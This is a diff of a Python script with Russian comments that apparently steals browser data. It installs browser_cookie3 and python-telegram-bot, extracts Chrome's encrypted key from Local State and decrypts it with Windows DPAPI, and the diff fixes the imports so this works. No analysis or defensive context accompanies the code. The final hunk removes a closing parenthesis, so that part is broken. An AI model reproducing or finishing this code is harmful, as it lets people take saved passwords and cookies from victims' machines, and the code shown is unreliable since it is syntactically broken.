@@ -23,8 +23,7 @@ import sys
 import traceback
 from pathlib import Path
 from Cryptodome.Cipher import AES
-from win32crypt import CryptUnprotectData
-import browser_cookie3  # Добавлен импорт для работы с куками
+import win32crypt  # Исправленный импорт
 
 # =============================================
 # АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ
@@ -37,8 +36,8 @@ def install_dependencies():
         'pillow',
         'psutil',
         'python-telegram-bot',
-        'pypiwin32; platform_system == "Windows"',
-        'browser_cookie3'  # Добавлена новая зависимость
+        'pywin32; platform_system == "Windows"',  # Исправлено название
+        'browser_cookie3'
     ]
     
     try:
@@ -114,7 +113,7 @@ def get_encryption_key(path):
             encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
             # Удаляем префикс DPAPI
             encrypted_key = encrypted_key[5:]
-            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]  # Исправленный вызов
     except Exception as e:
         debug_log(f"Ошибка получения ключа: {e}")
         return None
@@ -206,7 +205,6 @@ def get_cpu_name():
                     None,
                     ctypes.byref(buf),
                     ctypes.byref(buf_size)
-                )
                 ctypes.windll.advapi32.RegCloseKey(reg_key)
                 cpu_name = buf.value.strip()
                 cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
